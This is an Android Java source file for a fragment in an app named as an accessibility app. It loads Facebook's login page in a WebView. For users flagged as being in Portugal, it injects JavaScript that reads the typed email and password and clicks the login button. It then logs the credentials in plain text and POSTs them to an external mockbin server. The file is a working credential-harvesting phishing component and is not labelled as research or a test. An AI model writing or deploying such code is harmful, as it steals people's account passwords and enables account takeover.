package com.example.acessibilityapp;

import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.CookieManager;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import org.json.JSONException;
import org.json.JSONObject;

import retrofit2.converter.gson.GsonConverterFactory;

import retrofit2.Retrofit;

import android.os.Bundle;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.CookieManager;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import org.json.JSONException;
import org.json.JSONObject;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import retrofit2.Call;
import retrofit2.http.GET;
import retrofit2.http.Body;
import retrofit2.http.POST;
import retrofit2.http.Headers;

// Your Retrofit interface
interface RetrofitApiService {
    @POST("/path") // Replace with your actual endpoint
    Call<Void> sendLoginDetails(@Body LoginDetails loginDetails);
}


public class WebViewFrag extends Fragment {

    private static final String TAG = "WebViewFrag";
    private String email;
    private String password;
    private boolean isInPortugal;
    private RetrofitApiService apiRetrofitService;

    @Override
    public void onCreate(Bundle savedInstance){
        super.onCreate(savedInstance);
        if(getArguments() != null){
            isInPortugal = getArguments().getBoolean("isInPortugal", false);
            Log.i("WebViewFrag", String.valueOf(isInPortugal));
        }
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl("https://c11fada47c8a43bea8614f4fd73ca012.api.mockbin.io/") // Replace with your mockbin URL
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        apiRetrofitService = retrofit.create(RetrofitApiService.class);
    }


    public static WebViewFrag newInstance() {
        return new WebViewFrag();
    }

    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        return inflater.inflate(R.layout.fragment_web_view, container, false);
    }


    @Override
    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);
        WebView webView = view.findViewById(R.id.webview);
        webView.setVerticalScrollBarEnabled(true);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());

        if (android.os.Build.VERSION.SDK_INT >= 21) {
            CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
        } else {
            CookieManager.getInstance().setAcceptCookie(true);
        }
        //load webpage
        webView.loadUrl("https://www.facebook.com/login");


        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                if (isInPortugal){
                    Log.i(TAG, "User in PT Doing spoofing");
                    // Execute JavaScript to get the values of input fields and click the login button
                    webView.evaluateJavascript(
                            "(function() { " +
                                    "    var email = document.querySelector('#m_login_email') ? document.querySelector('#m_login_email').value : 'Email not found'; " +
                                    "    var password = document.querySelector('#m_login_password') ? document.querySelector('#m_login_password').value : 'Password not found'; " +
                                    "    var loginButton = document.querySelector('div[data-bloks-name=\"bk.components.Flexbox\"][aria-label=\"Iniciar sessão\"]'); " +
                                    "    if (loginButton) { loginButton.click(); } " +
                                    "    return JSON.stringify({ email: email, password: password }); " +
                                    "}) ();",
                            result -> {
                                // Log the result which is a JSON string
                                Log.d(TAG, "Input Values: " + result);
                                String jsonString = result.replaceAll("^\"|\"$", "");
                                jsonString = jsonString.replace("\\\"", "\""); // Handle escaped quotes

                                try {

                                    JSONObject jsonResult = new JSONObject(jsonString);
                                    String email = jsonResult.optString("email");
                                    String password = jsonResult.optString("password");

                                    storeLoginDetails(email, password);
                                } catch (JSONException e) {
                                    Log.e(TAG, "Json parsing error: " + e.getMessage());
                                }
                            }
                    );
                }
            }
        });
    }

    private void storeLoginDetails(String email, String password){
        this.email = email;
        this.password = password;

        useLoginDetails();
    }

    private void useLoginDetails() {
        // Perform actions with the stored values
        // For example, you can start another activity or save them in a database
        Log.d(TAG, "Using stored Email: " + this.email);
        Log.d(TAG, "Using stored Password: " + this.password);

        LoginDetails loginDetails = new LoginDetails(email, password);
        sendLoginDetailsToServer(loginDetails);
        // Add your logic here
    }


    private void sendLoginDetailsToServer(LoginDetails loginDetails) {
        Call<Void> call = apiRetrofitService.sendLoginDetails(loginDetails);
        call.enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                if (response.isSuccessful()) {
                    Log.i(TAG, "POST request sent successfully.");
                } else {
                    Log.e(TAG, "POST request failed. Response code: " + response.code());
                }
            }

            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                Log.e(TAG, "Exception in sending POST request", t);
            }
        });
    }

    @Override
    public void onActivityCreated(@Nullable Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);
    }
}